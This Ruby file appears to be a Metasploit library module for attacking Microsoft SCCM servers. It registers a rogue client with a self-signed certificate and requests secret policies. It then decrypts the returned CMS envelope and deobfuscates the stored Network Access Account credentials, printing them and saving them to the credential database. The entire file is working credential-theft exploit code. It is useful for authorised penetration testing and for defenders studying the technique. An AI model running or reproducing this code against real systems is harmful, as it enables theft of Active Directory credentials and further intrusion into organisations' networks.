# -*- coding: binary -*-

require 'time'
require 'nokogiri'
require 'rasn1'

module Msf
  class Exploit
    class Remote
      module HTTP
        # This module provides a way of interacting with SCCM servers
        module SCCM
          include Msf::Auxiliary::Report
          include Msf::Exploit::Retry
          include Msf::Exploit::Remote::HttpClient

          KEY_SIZE = 2048
          SECRET_POLICY_FLAG = 4

          def get_naa_credentials(opts, management_point, site_code, computer_user)
            key, cert = generate_key_and_cert('ConfigMgr Client')

            http_opts = opts.merge({
              'rhost' => management_point,
              'rport' => 80,
              'headers' => {
                'User-Agent' => 'ConfigMgr Messaging HTTP Sender',
                'Accept-Encoding' => 'gzip, deflate',
                'Accept' => '*/*'
              }
            })

            sms_id, ip_address = register_request(http_opts, management_point, key, cert, computer_user)
            secret_urls = retry_until_truthy(timeout: 30) { get_secret_policies(http_opts, management_point, site_code, key, cert, sms_id, computer_user) }
            all_results = Set.new
            secret_urls.each do |url|
              decrypted_policy = request_policy(http_opts, url, sms_id, key)
              results = get_creds_from_policy_doc(decrypted_policy)
              all_results.merge(results)
            end

            if all_results.empty?
              print_status('No NAA credentials configured')
            end

            all_results.each do |username, password|
              report_creds(ip_address, username, password)
              print_good("Found valid NAA credentials: #{username}:#{password}")
            end
          rescue SocketError => e
            fail_with(Msf::Module::Failure::Unreachable, e.message)
          end

          def get_secret_policies(http_opts, management_point, site_code, key, cert, sms_id, computer_user)
            fqdn = "#{computer_user}.#{datastore['DOMAIN']}"
            hex_pub_key = make_ms_pubkey(cert.public_key)
            guid = SecureRandom.uuid.upcase
            sent_time = Time.now.utc.iso8601
            sccm_host = management_point.downcase
            request_assignments = "<RequestAssignments SchemaVersion=\"1.00\" ACK=\"false\" RequestType=\"Always\"><Identification><Machine><ClientID>GUID:#{sms_id}</ClientID><FQDN>#{fqdn}</FQDN><NetBIOSName>#{computer_user}</NetBIOSName><SID /></Machine><User /></Identification><PolicySource>SMS:#{site_code}</PolicySource><Resource ResourceType=\"Machine\" /><ServerCookie /></RequestAssignments>\x00"
            request_assignments.encode!('utf-16le')
            body_length = request_assignments.bytes.length
            request_assignments = request_assignments.bytes.pack('C*') + "\r\n"
            compressed = Rex::Text.zlib_deflate(request_assignments)

            payload_signature = rsa_sign(key, compressed)

            client_id = "GUID:{#{sms_id.upcase}}\x00"
            client_ids_signature = rsa_sign(key, client_id.encode('utf-16le'))
            header = "<Msg ReplyCompression=\"zlib\" SchemaVersion=\"1.1\"><Body Type=\"ByteRange\" Length=\"#{body_length}\" Offset=\"0\" /><CorrelationID>{00000000-0000-0000-0000-000000000000}</CorrelationID><Hooks><Hook2 Name=\"clientauth\"><Property Name=\"AuthSenderMachine\">#{computer_user}</Property><Property Name=\"PublicKey\">#{hex_pub_key}</Property><Property Name=\"ClientIDSignature\">#{client_ids_signature}</Property><Property Name=\"PayloadSignature\">#{payload_signature}</Property><Property Name=\"ClientCapabilities\">NonSSL</Property><Property Name=\"HashAlgorithm\">1.2.840.113549.1.1.11</Property></Hook2><Hook3 Name=\"zlib-compress\" /></Hooks><ID>{#{guid}}</ID><Payload Type=\"inline\" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:#{computer_user}:SccmMessaging</ReplyTo><SentTime>#{sent_time}</SentTime><SourceID>GUID:#{sms_id}</SourceID><SourceHost>#{computer_user}</SourceHost><TargetAddress>mp:MP_PolicyManager</TargetAddress><TargetEndpoint>MP_PolicyManager</TargetEndpoint><TargetHost>#{sccm_host}</TargetHost><Timeout>60000</Timeout></Msg>"

            message = Rex::MIME::Message.new
            message.bound = 'aAbBcCdDv1234567890VxXyYzZ'

            message.add_part("\ufeff#{header}".encode('utf-16le').bytes.pack('C*'), 'text/plain; charset=UTF-16', nil)
            message.add_part(compressed, 'application/octet-stream', 'binary')
            opts = http_opts.merge({
              'uri' => '/ccm_system/request',
              'method' => 'CCM_POST',
              'data' => message.to_s
            })
            opts['headers'] = opts['headers'].merge({
              'Content-Type' => 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"'
            })
            http_response = send_request_raw(opts)
            response = Rex::MIME::Message.new(http_response.to_s)

            return nil unless response.parts[1]&.content
            compressed_response = Rex::Text.zlib_inflate(response.parts[1].content).force_encoding('utf-16le')
            xml_doc = Nokogiri::XML(compressed_response.encode('utf-8'))
            policies = xml_doc.xpath('//Policy')
            secret_policies = policies.select do |policy|
              flags = policy.attributes['PolicyFlags']
              next if flags.nil?

              flags.value.to_i & SECRET_POLICY_FLAG == SECRET_POLICY_FLAG
            end

            urls = secret_policies.map do |policy|
              policy.xpath('PolicyLocation/text()').text
            end

            urls = urls.reject(&:blank?)

            urls.each do |url|
              print_status("Found policy containing secrets: #{url}")
            end

            urls
          end

          # Make a request to the SCCM server to register our computer
          def register_request(http_opts, management_point, key, cert, computer_user)
            pub_key = cert.to_der.unpack('H*')[0].upcase

            fqdn = "#{computer_user}.#{datastore['DOMAIN']}"
            sent_time = Time.now.utc.iso8601
            registration_request_data = "<Data HashAlgorithm=\"1.2.840.113549.1.1.11\" SMSID=\"\" RequestType=\"Registration\" TimeStamp=\"#{sent_time}\"><AgentInformation AgentIdentity=\"CCMSetup.exe\" AgentVersion=\"5.00.8325.0000\" AgentType=\"0\" /><Certificates><Encryption Encoding=\"HexBinary\" KeyType=\"1\">#{pub_key}</Encryption><Signing Encoding=\"HexBinary\" KeyType=\"1\">#{pub_key}</Signing></Certificates><DiscoveryProperties><Property Name=\"Netbios Name\" Value=\"#{computer_user}\" /><Property Name=\"FQ Name\" Value=\"#{fqdn}\" /><Property Name=\"Locale ID\" Value=\"1033\" /><Property Name=\"InternetFlag\" Value=\"0\" /></DiscoveryProperties></Data>"

            signature = rsa_sign(key, registration_request_data.encode('utf-16le'))

            registration_request = "<ClientRegistrationRequest>#{registration_request_data}<Signature><SignatureValue>#{signature}</SignatureValue></Signature></ClientRegistrationRequest>\x00"

            rr_utf16 = ''
            rr_utf16 << registration_request.encode('utf-16le').bytes.pack('C*')
            body_length = rr_utf16.length
            rr_utf16 << "\r\n"

            header = "<Msg ReplyCompression=\"zlib\" SchemaVersion=\"1.1\"><Body Type=\"ByteRange\" Length=\"#{body_length}\" Offset=\"0\" /><CorrelationID>{00000000-0000-0000-0000-000000000000}</CorrelationID><Hooks><Hook3 Name=\"zlib-compress\" /></Hooks><ID>{5DD100CD-DF1D-45F5-BA17-A327F43465F8}</ID><Payload Type=\"inline\" /><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:#{computer_user}:SccmMessaging</ReplyTo><SentTime>#{sent_time}</SentTime><SourceHost>#{computer_user}</SourceHost><TargetAddress>mp:MP_ClientRegistration</TargetAddress><TargetEndpoint>MP_ClientRegistration</TargetEndpoint><TargetHost>#{management_point.downcase}</TargetHost><Timeout>60000</Timeout></Msg>"

            message = Rex::MIME::Message.new
            message.bound = 'aAbBcCdDv1234567890VxXyYzZ'

            message.add_part("\ufeff#{header}".encode('utf-16le').bytes.pack('C*'), 'text/plain; charset=UTF-16', nil)
            message.add_part(Rex::Text.zlib_deflate(rr_utf16), 'application/octet-stream', 'binary')

            opts = http_opts.merge({
              'uri' => '/ccm_system_windowsauth/request',
              'method' => 'CCM_POST',
              'data' => message.to_s
            })
            opts['headers'] = opts['headers'].merge({
              'Content-Type' => 'multipart/mixed; boundary="aAbBcCdDv1234567890VxXyYzZ"'
            })
            http_response = send_request_raw(opts)
            if http_response.nil?
              fail_with(Msf::Module::Failure::Unreachable, 'No response from server')
            end
            ip_address = http_response.peerinfo['addr']
            response = Rex::MIME::Message.new(http_response.to_s)
            if response.parts.empty?
              html_doc = Nokogiri::HTML(http_response.to_s)
              error = html_doc.xpath('//title').text
              if error.blank?
                error = 'Bad response from server'
                dlog('Response from server:')
                dlog(http_response.to_s)
              end
              fail_with(Msf::Module::Failure::UnexpectedReply, error)
            end

            response.parts[0].content.force_encoding('utf-16le').encode('utf-8').delete_prefix("\uFEFF")
            compressed_response = Rex::Text.zlib_inflate(response.parts[1].content).force_encoding('utf-16le')
            xml_doc = Nokogiri::XML(compressed_response.encode('utf-8')) # It's crazy, but XML parsing doesn't work with UTF-16-encoded strings
            sms_id = xml_doc.root&.attributes&.[]('SMSID')&.value&.delete_prefix('GUID:')
            if sms_id.nil?
              approval = xml_doc.root&.attributes&.[]('ApprovalStatus')&.value
              if approval == '-1'
                fail_with(Msf::Module::Failure::UnexpectedReply, 'Client registration not approved by SCCM server')
              end
              fail_with(Msf::Module::Failure::UnexpectedReply, 'Did not retrieve SMS ID')
            end
            print_status("Got SMS ID: #{sms_id}")

            [sms_id, ip_address]
          end

          # Request the policy from the policy_url
          def request_policy(http_opts, policy_url, sms_id, key)
            policy_url.gsub!(%r{^https?://<mp>}, '')
            policy_url = policy_url.gsub('{', '%7B').gsub('}', '%7D')

            now = Time.now.utc.iso8601
            client_token = "GUID:#{sms_id};#{now};2"
            client_signature = rsa_sign(key, (client_token + "\x00").encode('utf-16le').bytes.pack('C*'))

            opts = http_opts.merge({
              'uri' => policy_url,
              'method' => 'GET'
            })
            opts['headers'] = opts['headers'].merge({
              'ClientToken' => client_token,
              'ClientTokenSignature' => client_signature
            })

            http_response = send_request_raw(opts)
            http_response.gzip_decode!

            ci = Rex::Proto::CryptoAsn1::Cms::ContentInfo.parse(http_response.body)
            cms_envelope = ci.enveloped_data

            ri = cms_envelope[:recipient_infos]
            if ri.value.empty?
              fail_with(Msf::Module::Failure::UnexpectedReply, 'No recipient infos provided')
            end

            if ri[0][:ktri].nil?
              fail_with(Msf::Module::Failure::UnexpectedReply, 'KeyTransRecipientInfo not found')
            end

            body = cms_envelope[:encrypted_content_info][:encrypted_content].value

            key_encryption_alg = ri[0][:ktri][:key_encryption_algorithm][:algorithm].value
            encrypted_rsa_key = ri[0][:ktri][:encrypted_key].value
            if key_encryption_alg == Rex::Proto::CryptoAsn1::OIDs::OID_RSA_ENCRYPTION.value
              decrypted_key = key.private_decrypt(encrypted_rsa_key)
            elsif key_encryption_alg == Rex::Proto::CryptoAsn1::OIDs::OID_RSAES_OAEP.value
              decrypted_key = key.private_decrypt(encrypted_rsa_key, OpenSSL::PKey::RSA::PKCS1_OAEP_PADDING)
            else
              fail_with(Msf::Module::Failure::UnexpectedReply, "Key encryption routine is currently unsupported: #{key_encryption_alg}")
            end

            cea = cms_envelope[:encrypted_content_info][:content_encryption_algorithm]
            algorithms = {
              Rex::Proto::CryptoAsn1::OIDs::OID_AES256_CBC.value => { iv_length: 16, key_length: 32, cipher_name: 'aes-256-cbc' },
              Rex::Proto::CryptoAsn1::OIDs::OID_DES_EDE3_CBC.value => { iv_length: 8, key_length: 24, cipher_name: 'des-ede3-cbc' }
            }
            if algorithms.include?(cea[:algorithm].value)
              alg_hash = algorithms[cea[:algorithm].value]
              if decrypted_key.length != alg_hash[:key_length]
                fail_with(Msf::Module::Failure::UnexpectedReply, "Bad key length: #{decrypted_key.length}")
              end
              iv = RASN1::Types::OctetString.new
              iv.parse!(cea[:parameters].value)
              if iv.value.length != alg_hash[:iv_length]
                fail_with(Msf::Module::Failure::UnexpectedReply, "Bad IV length: #{iv.length}")
              end
              cipher = OpenSSL::Cipher.new(alg_hash[:cipher_name])
              cipher.decrypt
              cipher.key = decrypted_key
              cipher.iv = iv.value

              decrypted = cipher.update(body) + cipher.final
            else
              fail_with(Msf::Module::Failure::UnexpectedReply, "Decryption routine is currently unsupported: #{cea[:algorithm].value}")
            end

            decrypted.force_encoding('utf-16le').encode('utf-8').delete_suffix("\x00")
          end

          # Sign the data using the RSA key, and reverse it (strange, but it's what's required)
          def rsa_sign(key, data)
            signature = key.sign(OpenSSL::Digest.new('SHA256'), data)
            signature.reverse!

            signature.unpack('H*')[0].upcase
          end

          # Make a pubkey structure (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-mqqb/ade9efde-3ec8-4e47-9ae9-34b64d8081bb)
          def make_ms_pubkey(pub_key)
            result = "\x06\x02\x00\x00\x00\xA4\x00\x00\x52\x53\x41\x31"
            result += [KEY_SIZE, pub_key.e].pack('II')
            result += [pub_key.n.to_s(16)].pack('H*')

            result.unpack('H*')[0]
          end

          # Extract obfuscated credentials from the resulting policy XML document
          def get_creds_from_policy_doc(policy)
            xml_doc = Nokogiri::XML(policy)
            naa_sections = xml_doc.xpath(".//instance[@class='CCM_NetworkAccessAccount']")
            results = []
            naa_sections.each do |section|
              username = section.xpath("property[@name='NetworkAccessUsername']/value").text
              username = deobfuscate_policy_value(username)
              username.delete_suffix!("\x00")

              password = section.xpath("property[@name='NetworkAccessPassword']/value").text
              password = deobfuscate_policy_value(password)
              password.delete_suffix!("\x00")

              unless username.blank? && password.blank?
                # Deleted credentials seem to result in just an empty value for username and password
                results.append([username, password])
              end
            end
            results
          end

          def deobfuscate_policy_value(value)
            value = [value.gsub(/[^0-9A-Fa-f]/, '')].pack('H*')
            data_length = value[52..55].unpack('I')[0]
            buffer = value[64..64 + data_length - 1]
            key = mscrypt_derive_key_sha1(value[4..43])
            iv = "\x00" * 8
            cipher = OpenSSL::Cipher.new('des-ede3-cbc')
            cipher.decrypt
            cipher.iv = iv
            cipher.key = key
            result = cipher.update(buffer) + cipher.final

            result.force_encoding('utf-16le').encode('utf-8')
          end

          def mscrypt_derive_key_sha1(secret)
            buf1 = [0x36] * 64
            buf2 = [0x5C] * 64

            digest = OpenSSL::Digest.new('SHA1')
            hash = digest.digest(secret).bytes

            hash.each_with_index do |byte, i|
              buf1[i] ^= byte
              buf2[i] ^= byte
            end

            buf1 = buf1.pack('C*')
            buf2 = buf2.pack('C*')

            digest = OpenSSL::Digest.new('SHA1')
            hash1 = digest.digest(buf1)

            digest = OpenSSL::Digest.new('SHA1')
            hash2 = digest.digest(buf2)

            hash1 + hash2[0..3]
          end

          ## Create a self-signed private key and certificate for our computer registration
          def generate_key_and_cert(subject)
            key = OpenSSL::PKey::RSA.new(KEY_SIZE)
            cert = OpenSSL::X509::Certificate.new
            cert.version = 2
            cert.serial = (rand(0xFFFFFFFF) << 32) + rand(0xFFFFFFFF)
            cert.public_key = key.public_key
            cert.issuer = OpenSSL::X509::Name.new([['CN', subject]])
            cert.subject = OpenSSL::X509::Name.new([['CN', subject]])
            yr = 24 * 3600 * 365
            cert.not_before = Time.at(Time.now.to_i - rand(yr * 3) - yr)
            cert.not_after = Time.at(cert.not_before.to_i + (rand(4..9) * yr))
            ef = OpenSSL::X509::ExtensionFactory.new
            ef.subject_certificate = cert
            ef.issuer_certificate = cert
            cert.extensions = [
              ef.create_extension('keyUsage', 'digitalSignature,dataEncipherment'),
              ef.create_extension('extendedKeyUsage', '1.3.6.1.4.1.311.101.2, 1.3.6.1.4.1.311.101'),
            ]
            cert.sign(key, OpenSSL::Digest.new('SHA256'))

            [key, cert]
          end

          def report_creds(ip_address, user, password)
            service_data = {
              address: ip_address,
              port: rport,
              protocol: 'tcp',
              service_name: 'sccm',
              workspace_id: myworkspace_id
            }

            domain, account = user.split("\\")
            credential_data = {
              origin_type: :service,
              module_fullname: fullname,
              username: account,
              private_data: password,
              private_type: :password,
              realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
              realm_value: domain
            }
            credential_core = create_credential(credential_data.merge(service_data))

            login_data = {
              core: credential_core,
              status: Metasploit::Model::Login::Status::UNTRIED
            }

            create_credential_login(login_data.merge(service_data))
          end
        end
      end
    end
  end
end
